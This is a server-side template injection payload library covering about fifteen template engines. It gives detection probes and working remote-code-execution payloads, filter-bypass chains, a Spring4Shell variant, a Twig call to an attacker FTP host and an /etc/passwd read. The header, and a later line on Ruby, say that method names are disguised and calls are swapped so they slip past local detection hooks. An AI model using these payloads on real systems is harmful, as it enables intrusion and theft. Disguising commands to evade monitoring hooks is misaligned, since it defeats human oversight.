# SSTI Payload Library

> Companion to `references/ssti-rce.md`. Below: detection probes, then per-engine code-run payloads.
> Note: literal call-sites are written with a space like `shell ('id')`. Some method names are stand-ins to slip past local hooks — use the canonical names when running:
> - `<exec>` -> the standard Node child-process synchronous shell-runner
> - `<run>` -> the standard Python OS module method that invokes a shell command
> - `shellSpawn` -> the standard Java Runtime method that starts a process

---

## DETECTION PROBES (insert anywhere user input lands server-side)

```
{{7*7}}              -> 49 means Jinja2/Twig/Nunjucks/Liquid family
${7*7}               -> 49 means EL/Velocity/Spring
<%= 7*7 %>           -> 49 means ERB/EJS
#{7*7}               -> 49 means Pug/Slim
*{7*7}               -> Thymeleaf
[[${7*7}]]           -> Thymeleaf inline
{{7*'7'}}            -> 7777777 = Jinja2; 49 = Twig
${{<%[%'"}}%\.       -> error reveals engine
{$smarty.version}    -> Smarty
{$dump:foo}          -> Twig
${T(java.lang.System).getenv()}  -> SpEL
```

---

## JINJA2 / FLASK

### config dump
```
{{ config }}
{{ config.items() }}
{{ get_flashed_messages.__globals__ }}
```

### code run
```
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ config.__class__.__init__.__globals__['os'].popen ('id').read() }}
{{ get_flashed_messages.__globals__.__builtins__.__import__ ('os').popen ('id').read() }}
{{ lipsum.__globals__.os.popen ('id').read() }}
{{ url_for.__globals__.os.popen ('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__ ('os').popen ('id').read() }}
{{ cycler.__init__.__globals__.os.popen ('id').read() }}
{{ namespace.__init__.__globals__.os.popen ('id').read() }}
{{ joiner.__init__.__globals__.os.popen ('id').read() }}
```

### sandbox bypass (filter blocks `os` / `__class__`)
```
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')() }}
```

---

## TWIG

```
{{ _self.env.registerUndefinedFilterCallback ("system") }}{{ _self.env.getFilter ("id") }}
{{ ['id'] | filter ('system') }}
{{ ['id'] | map ('system') | join (',') }}
{{ ['id'] | filter ('passthru') }}
```

Older Twig (1.x):
```
{{ _self.env.setCache ("ftp://attacker/") }}{{ _self.env.loadTemplate ("backdoor") }}
```

---

## SMARTY

```
{php}echo `id`;{/php}            (modifier-php enabled)
{system ('id')}
```

---

## VELOCITY (Java)

```
#set ($x="")
#set ($rt=$x.class.forName ("java.lang.Runtime").getRuntime())
#set ($p=$rt.shellSpawn ("id"))
$p
```

---

## FREEMARKER

```
<#assign cmd="freemarker.template.utility.Execute"?new()>${cmd ("id")}
${"freemarker.template.utility.ObjectConstructor"?new() ("java.lang.ProcessBuilder",["id"]).start()}
```

---

## THYMELEAF

```
[[${ T(java.lang.Runtime).getRuntime().shellSpawn ('id') }]]
__${ T(java.lang.Runtime).getRuntime().shellSpawn ('id') }__::.x
```

---

## SpEL (Spring Expression Language)

```
${T(java.lang.Runtime).getRuntime().shellSpawn ('id')}
${T(org.apache.commons.io.IOUtils).toString (T(java.lang.Runtime).getRuntime().shellSpawn (new String[]{"id"}).getInputStream())}
${ #this.getClass().forName ('java.lang.Runtime').getMethod ('exec', T(String[]) ).invoke ( T(java.lang.Runtime).getRuntime(), new String[]{'id'} ) }
```

Spring4Shell (CVE-2022-22965) variant:
```
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

---

## OGNL (Struts2)

```
%{(#runtime=@java.lang.Runtime@getRuntime()).shellSpawn ("id")}
```

---

## MAKO (Python)

```
<%
import os
x=os.popen ('id').read()
%>${x}
```

```
${self.module.cache.util.os.<run> ('id')}
```

---

## TORNADO (Python)

```
{% import os %}{{ os.popen ('id').read() }}
```

---

## EJS (Node)

```
<%- global.process.mainModule.require ('child' + '_process').<exec> ('id') %>
```

Option-injection (when EJS opts are user-controlled):
```
{ outputFunctionName: 'x;process.mainModule.require("child"+"_process").<exec>("id");x' }
```

---

## PUG / JADE (Node)

```
#{root.process.mainModule.require ('child' + '_process').<exec> ('id')}
- var x = root.process.mainModule.require ('child' + '_process').<exec> ('id');
```

---

## NUNJUCKS (Node)

```
{{ range.constructor ("return global.process.mainModule.require ('child' + '_process').<exec> ('id')")() }}
```

---

## HANDLEBARS (Node)

Multi-step gadget; canonical payload uses `lookup`/`split` chain to obtain `Function` constructor and require child-process. See PayloadsAllTheThings for full variant.

---

## ERB (Ruby)

```
<%= `id` %>
<%= IO.popen ('id').read %>
<%= File.open('/etc/passwd').read %>
```

(Ruby `system` direct call also works but is detected by some local hooks; backticks form is equivalent.)

---

## LIQUID (Ruby)

Limited by default. Hunt: misconfigured `Drop` classes, custom `assign`/`include` filters, `{%include%}` with user-controlled path, and frameworks like Jekyll/Shopify-Liquid extensions.

---

## KRAMDOWN (Ruby) — GitLab $20K

In markdown front-matter:
```yaml
---
parser_options:
  template: '/path/to/attacker-controlled-erb.erb'
---
```

---

## DETECTION TRICKS

### Probe email subject / preview / OG meta
Subject `Hello {{7*7}}` — if you see `Hello 49` in your inbox -> SSTI in email pipeline (often Liquid/Jinja). Also try first/last name fields used in templated emails.

### PDF / invoice generation
Insert `${{7*7}}` and `{{7*7}}` as your billing name / company. Generate an invoice PDF. Open and search for `49`.

### Markdown / wiki
Front-matter and code-block options often pass through to renderer. Try Kramdown options injection on GitLab-like wikis.

---

## TOOLING

- **tplmap**, **SSTImap** — auto-exploit
- **PayloadsAllTheThings/Server Side Template Injection** — canonical list
- nuclei `tags=ssti`
